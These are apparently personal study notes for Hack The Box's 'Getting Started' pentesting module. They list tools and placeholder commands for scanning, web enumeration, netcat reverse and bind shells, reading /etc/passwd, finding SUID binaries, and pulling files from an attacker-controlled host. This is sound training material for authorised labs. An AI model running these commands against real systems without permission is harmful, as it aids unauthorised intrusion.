# Getting Started

**Status:** ✅ Completed — 10 December 2025
**Difficulty:** Fundamental
**Tier:** 0

> Practical fundamentals for approaching and attacking HTB machines.

## Pentesting Fundamentals

### Common Terms

* **Target** — Host or system being assessed.
* **Enumeration** — Gathering detailed information about discovered services and attack surfaces.
* **Exploit** — Technique or code that takes advantage of a vulnerability.
* **Payload** — Code or data delivered through an exploit to perform an action.
* **Foothold** — Initial access to a target system.
* **Privilege Escalation** — Obtaining higher privileges after gaining initial access.
* **Post-Exploitation** — Actions performed after gaining access, such as enumeration, credential discovery, and collecting information.

### Basic Tools

| Tool            | Purpose                               |
| --------------- | ------------------------------------- |
| `nmap`          | Network and service enumeration       |
| `gobuster`      | Directory/DNS enumeration             |
| `ffuf`          | Web fuzzing                           |
| `curl`          | HTTP requests and interaction         |
| `wget`          | Download files                        |
| `nc` / `netcat` | Network connections and shells        |
| `ssh`           | Remote access                         |
| `searchsploit`  | Search Exploit-DB for public exploits |
| `msfconsole`    | Metasploit Framework                  |

### Service Scanning

Identify open ports and services:

```bash
nmap -sC -sV <TARGET>
```

Scan all TCP ports:

```bash
nmap -p- <TARGET>
```

Enumerate discovered ports:

```bash
nmap -p <PORTS> -sC -sV <TARGET>
```

| Option | Purpose                   |
| ------ | ------------------------- |
| `-sC`  | Default NSE scripts       |
| `-sV`  | Service/version detection |
| `-p-`  | Scan all TCP ports        |

### Web Enumeration

Basic HTTP interaction:

```bash
curl http://<TARGET>
curl -I http://<TARGET>
```

Directory enumeration:

```bash
gobuster dir -u http://<TARGET> -w <WORDLIST>
```

Web fuzzing:

```bash
ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>
```

Look for hidden directories/files, login pages, technologies, versions, parameters, and exposed configuration or backup files.

### Public Exploits

Search for known public exploits:

```bash
searchsploit <SERVICE>
searchsploit "<PRODUCT> <VERSION>"
```

Verify that the exploit matches the target's product, version, and configuration before attempting to use it.

### Shells

Reverse shell listener:

```bash
nc -lvnp <PORT>
```

Connect to a bind shell:

```bash
nc <TARGET> <PORT>
```

Keep track of the attacker IP, target IP, listening port, shell type, and current user.

### Privilege Escalation

Basic system enumeration:

```bash
whoami
id
hostname
uname -a
```

Check sudo permissions:

```bash
sudo -l
```

Enumerate users and groups:

```bash
cat /etc/passwd
cat /etc/group
```

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

> **Enumerate first. Exploit second.**

### File Transfers

Start a temporary HTTP server:

```bash
python3 -m http.server <PORT>
```

Download with `wget`:

```bash
wget http://<ATTACKER_IP>:<PORT>/<FILE>
```

Download with `curl`:

```bash
curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
```

## Quick Reference

```bash
# HTB VPN
sudo openvpn user.ovpn

# Scanning
nmap -p- <TARGET>
nmap -sC -sV <TARGET>

# Web enumeration
gobuster dir -u http://<TARGET> -w <WORDLIST>
ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>

# HTTP
curl -I http://<TARGET>

# Public exploits
searchsploit <SERVICE>

# Listener
nc -lvnp <PORT>

# Linux enumeration
whoami
id
hostname
uname -a
sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# File transfer
python3 -m http.server <PORT>
wget http://<ATTACKER_IP>:<PORT>/<FILE>
curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
```

## Related Modules

* [Network Enumeration with Nmap](../network-enumeration-with-nmap/README.md)
* [Attacking Web Applications with Ffuf](../../web/attacking-web-applications-with-ffuf/README.md)
* [Using the Metasploit Framework](../../exploitation/using-the-metasploit-framework/README.md)
* [Using Web Proxies](../../web/using-web-proxies/README.md)
* [Nibbles — Machine Writeup](../../../easy-machines/nibbles/README.md)

## Achievement

[Your first battle](https://academy.hackthebox.com/achievement/badge/e29c6299-d5ce-11f0-9254-bea50ffe6cb4)
